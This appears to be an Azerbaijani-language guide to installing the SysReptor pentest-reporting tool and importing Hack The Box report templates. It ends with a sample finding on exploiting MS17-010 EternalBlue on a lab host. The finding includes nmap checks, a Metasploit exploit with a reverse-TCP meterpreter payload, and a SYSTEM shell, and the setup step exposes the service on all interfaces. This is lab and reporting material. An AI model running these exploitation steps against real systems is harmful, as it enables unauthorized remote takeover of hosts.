# SysReptor Sıfırdan Quraşdırılma və HTB Şablonlarının Sazlanması

### 1. Addım: Repository-ni Klonlamaq və Qovluğa Keçid
```bash
git clone [https://github.com/SysLifters/sysreptor.git](https://github.com/SysLifters/sysreptor.git)
cd sysreptor
./install.sh

cd deploy

# app.env faylına xarici qoşulma dəyişənini əlavə edirik
echo "BIND_PORT=0.0.0.0:8000:8000" >> ../app.env

# docker-compose.yml faylında localhost məhdudiyyətini tamamilə silirik
sed -i 's/${BIND_PORT:-127.0.0.1:8000:8000}/"8000:8000"/g' docker-compose.yml

sudo ufw allow 8000/tcp

docker compose down
docker compose up -d

# Portun 0.0.0.0:8000 olaraq dinlənildiyini təsdiqləyin
sudo ss -tlnp | grep 8000

# Kali Linux-un İP ünvanını öyrənin (Windows-dan girmək üçün)
ip a

# HTB CPTS rəsmi hesabat dizaynını import edin
curl -s "[https://docs.sysreptor.com/assets/htb-designs.tar.gz](https://docs.sysreptor.com/assets/htb-designs.tar.gz)" | docker compose exec --no-TTY app python3 manage.py importdemodata --type=design

# Nümunə HTB CPTS maşın hesabatını import edin
curl -s "[https://docs.sysreptor.com/assets/htb-demo-projects.tar.gz](https://docs.sysreptor.com/assets/htb-demo-projects.tar.gz)" | docker compose exec --no-TTY app python3 manage.py importdemodata --type=project
```

# Start
```powershell
cd /home/sako/sysreptor/deploy
docker compose up -d
```

<img width="1457" height="833" alt="image" src="https://github.com/user-attachments/assets/eaba413f-d080-4f01-8952-ff7c2cd7d583" />
---


# Findings
---

```powershell
## Description
A critical Remote Code Execution (RCE) vulnerability was identified on the target host, 
attributed to the MS17-010 (EternalBlue) flaw in the SMBv1 protocol. This vulnerability 
allows an unauthenticated attacker to execute arbitrary code with SYSTEM-level privileges 
by sending a specially crafted packet to the SMB service on port 445/tcp. No user 
interaction or valid credentials are required to exploit this vulnerability.

## Affected Host
| Field    | Details                  |
|----------|--------------------------|
| IP       | 10.10.10.10              |
| Port     | 445/tcp (SMB)            |
| OS       | Windows 7 SP1 x64        |
| Hostname | LEGACY                   |
| Severity | Critical (CVSS 9.8)      |

## Steps to Reproduce

**1. Service Discovery**
```bash
nmap -sV -p 445 10.10.10.10
# OUTPUT:
# 445/tcp open microsoft-ds Windows 7 Professional 7601 SP1
```

**2. Vulnerability Verification**
```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.10
# OUTPUT:
# VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1
# Risk factor: HIGH
```

**3. Exploitation**
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.14.x
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# OUTPUT:
# [*] Started reverse TCP handler on 10.10.14.x:4444
# [+] 10.10.10.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] WIN!
# [*] Meterpreter session 1 opened
```

**4. Privilege Verification**
```bash
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
# Computer: LEGACY
# OS: Windows 7 SP1 (Build 7601)
```

## Evidence
![SYSTEM shell obtained on 10.10.10.10](/images/name/image.png)

## Impact
Successful exploitation of this vulnerability grants an unauthenticated attacker 
**SYSTEM-level privileges** on the target host. This represents a complete compromise 
of the affected system, enabling the attacker to:

- Extract credential material (password hashes, plaintext passwords)
- Establish persistent backdoor access
- Pivot to additional internal network segments
- Exfiltrate sensitive data stored on the host

## Remediation

**Immediate Actions (Short-term):**
- Apply Microsoft security patch **KB4012212** immediately
- Disable **SMBv1** protocol across all systems:
```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```
- Block inbound traffic on **port 445/tcp** at the perimeter firewall

**Long-term Recommendations:**
- Enforce a patch management policy ensuring critical patches are applied within 48 hours
- Implement network segmentation to limit lateral movement opportunities
- Deploy an EDR solution to detect exploitation attempts in real-time
- Conduct regular vulnerability scanning across all internal hosts

## References
- [MS17-010 Microsoft Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [CVSS Score: 9.8 (Critical)](https://www.first.org/cvss/calculator/3.1)

